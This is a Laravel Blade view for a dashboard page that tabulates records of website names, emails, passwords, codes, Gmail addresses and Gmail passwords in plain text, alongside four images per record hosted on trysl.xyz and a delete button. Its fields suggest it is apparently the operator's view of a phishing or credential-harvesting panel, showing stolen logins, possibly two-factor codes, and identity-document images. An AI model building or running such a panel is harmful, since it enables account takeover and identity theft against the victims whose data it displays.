@extends('auth.dashboards.users.app')
@section('content')
        <div class="page-body">
          <div class="container-fluid">
            <div class="page-title">
              <div class="row">
                <div class="col-12 col-sm-6">
                  <h3>All Informations</h3>
                </div>

              </div>
            </div>
          </div>
          <!-- Container-fluid starts-->
          <div class="container-fluid list-products">
            <div class="row">
              <!-- Individual column searching (text inputs) Starts-->
              <div class="col-sm-12">
                <div class="card">
                 
                  <div class="card-body">
                    <div class="table-responsive">
                      <table class="display" id="basic-2">
                        <thead>
                          <tr>
                            <th>ID</th>
                                    <th>Website Name</th>
                                    <th>Email</th>
                                    <th>Password</th>
                                    <th>Code</th>
                                    <th>Gmail</th>
                                    <th>Gmail Password</th>
                                     <th>Image</th>
                                    <th>Image</th>
                                     <th>Id 1</th>
                                    <th>Id 2</th>
                                    <th>Date</th>
                                    <th>Action</th>
                          </tr>
                        </thead>
                        <tbody>
                          @foreach($informations as $data)
                                    <tr>
                                        <td>{{$loop -> index+1}}</td>
                                        <td>{{$data->domain}}</td>
                                        <td>{{$data->email}}</td>
                                        <td>{{$data->password}}</td>
                                        <td>{{$data->code}}</td>
                                        <td>{{$data->gmail}}</td>
                                        <td>{{$data->gmail_password}}</td>
                                        
                                          <td><a href="https://trysl.xyz/{{$data->id_one}}"><img src="https://trysl.xyz/{{$data->id_one}}" alt="" class="w-100" style="height: 50px"></a></td>
                                        <td><a href="https://trysl.xyz/{{$data->id_two}}"><img src="https://trysl.xyz/{{$data->id_two}}" alt="" class="w-100" style="height: 50px"></a></td>
                                         <td><a href="https://trysl.xyz/{{$data->id_three}}"><img src="https://trysl.xyz/{{$data->id_three}}" alt="" class="w-100" style="height: 50px"></a></td>
                                        <td><a href="https://trysl.xyz/{{$data->id_four}}"><img src="https://trysl.xyz/{{$data->id_four}}" alt="" class="w-100" style="height: 50px"></a></td>
                                        
                                        <td>{{$data->created_at}}</td>
                                         <td><a href="{{url('admin/info/delete/'.$data->id)}}" id="delete" class="btn btn-danger btn-xs"  data-original-title="btn btn-danger btn-xs" title="" data-bs-original-title="">Delete</a></td>
                                    </tr>
                                @endforeach
                          
                        </tbody>
                      </table>
                    </div>
                  </div>
                </div>
              </div>
            </div>
          </div>
          <!-- Individual column searching (text inputs) Ends-->
          <!-- Container-fluid Ends-->
        </div>
@endsection
